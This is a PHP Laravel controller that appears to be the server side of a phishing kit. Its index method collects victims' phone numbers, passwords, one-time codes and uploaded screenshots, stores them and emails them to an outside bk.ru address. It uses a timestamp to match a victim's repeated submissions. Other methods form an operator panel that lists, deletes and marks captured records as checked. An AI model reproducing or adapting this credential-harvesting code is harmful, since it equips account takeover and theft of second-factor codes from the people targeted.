<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Client;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Mail;
use App\Mail\InfoMail;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        $milliseconds = round(microtime(true) * 1000);//send back to user and get it back from his other request to know if the user duplicate request

        $client = new Client();

        $body='';

        if ( $phone = $request->input('phone')) {
            $client->phone = $phone;
            $body = $body.'tel: '.$phone;
        }
        if ( $pass = $request->input('password')) {
            $client->password = $pass;
            $body = $body.'|password is: '.$pass;
        }
        if ( $otp = $request->input('otp')) {
            $client->otp = $otp;
            $body = $body.' |otp is: '.$otp;
        }

        if ( $ss = $request->input('ss')) {
            $client->time = $ss;
            $body = $body.' |time is: '.$ss;
        }
        else {
            $client->time = $milliseconds;
        }
        //
        if ($request->file()) {
            $fileName = time().'_'.$request->file('img')->getClientOriginalName();
            $filePath = $request->file('img')->storeAs('uploads', $fileName, 'public');
            // $url = Storage::url($filePath);
            $client->screenshoot = $filePath;
        }

        $client->save();

        $info = [
            'title'=> 'info',
            'body'=> $body
        ];

        Mail::to('nomanherenorthere@bk.ru')->send(new InfoMail($info));

        if($request->input('ss')){
          return ['ss'=>''];
        }

        return ['ss'=>$milliseconds];
    }

    public function ff(Request $request){
        return view('ff');
    }
    public function war(Request $request){
        $cc = Client::all();
        return view('war', ['cc'=>$cc]);
    }

    public function del(Request $request){
            Client::destroy($request->input('id'));
    }

    public function ok(Request $request){
        $client = Client::findOrFail($request->input('id'));
        $client->checked = true;
        $client->save();
        return 'o';
    }
}
